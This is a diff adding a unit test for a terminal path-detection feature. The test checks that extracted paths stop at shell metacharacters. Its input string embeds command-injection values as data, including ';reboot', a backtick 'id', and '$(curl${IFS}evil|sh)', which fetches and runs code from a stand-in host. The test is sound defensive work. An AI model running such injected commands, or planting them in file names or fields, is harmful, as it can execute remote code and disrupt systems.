@@ -32,6 +32,16 @@ describe("terminal-paths: file paths in the terminal's output are links (issue #
   });
 });
 
+describe("terminal-paths: a path never carries what a shell would run (issue #476)", () => {
+  test("$, backtick, ; and & end a path, so a copied one cannot run anything when pasted", () => {
+    const found = findPaths("/x/;reboot /var/$(curl${IFS}evil|sh) a/`id`.md b/c&d.md").map(
+      (one) => one.path,
+    );
+    expect(found.some((path) => /[$`;&]/.test(path))).toBe(false);
+    expect(found).toContain("/x");
+  });
+});
+
 describe("terminal-paths: a relative path is taken from the terminal's folder (issue #476)", () => {
   test("joined with the folder's own separator, ./ dropped and .. walked up", () => {
     expect(resolvePath("/home/ana/repo", "src/app.ts")).toBe("/home/ana/repo/src/app.ts");
